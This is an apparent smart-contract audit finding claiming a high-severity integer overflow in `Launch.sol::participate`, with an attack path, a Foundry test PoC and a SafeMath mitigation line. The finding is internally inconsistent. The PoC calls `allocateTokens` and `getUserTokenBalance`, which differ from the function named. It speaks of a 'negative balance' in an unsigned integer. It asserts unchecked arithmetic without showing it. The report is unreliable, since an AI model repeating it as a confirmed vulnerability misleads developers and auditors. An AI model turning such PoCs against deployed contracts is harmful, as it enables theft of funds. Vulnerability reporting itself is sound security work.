# [High] `Launch.sol::participate` `newUserTokenAmount` Integer Overflow in Token Allocation

### Summary

When allocating user tokens in `newUserTokenAmount`, there is a risk of integer overflow, leading to incorrect balances or unintended allocation limits being exceeded.



### Root Cause

In `Launch.sol:256`, The contract does not use SafeMath, allowing unchecked arithmetic operations.

### Internal Pre-conditions

The contract calculates new user token amounts using basic addition (userTokenAmount + request.tokenAmount).

### External Pre-conditions

1. A user submits a request with a very large tokenAmount value.

2. The storage variable userTokenAmount is close to the uint256 max value.



### Attack Path

1. The attacker submits a request with a very large tokenAmount.

2. The addition causes an integer overflow.

3. The contract records an incorrect or negative balance.



### Impact

1. Incorrect user balances.

2. Bypassing of allocation limits.

3. Potential loss of funds.

### PoC

contract OverflowTest is Test {
    Launch contractInstance;
    address attacker = address(0xBEEF);
    function setUp() public {
        contractInstance = new Launch();
    }

    function testOverflowAttack() public {
        vm.startPrank(attacker);
        contractInstance.allocateTokens(type(uint256).max - 1);
        contractInstance.allocateTokens(10); // Causes overflow
        assert(contractInstance.getUserTokenBalance(attacker) < 10);
        vm.stopPrank();
    }
}

### Mitigation

+ ---> uint256 newUserTokenAmount = userTokenAmount.add(request.tokenAmount);
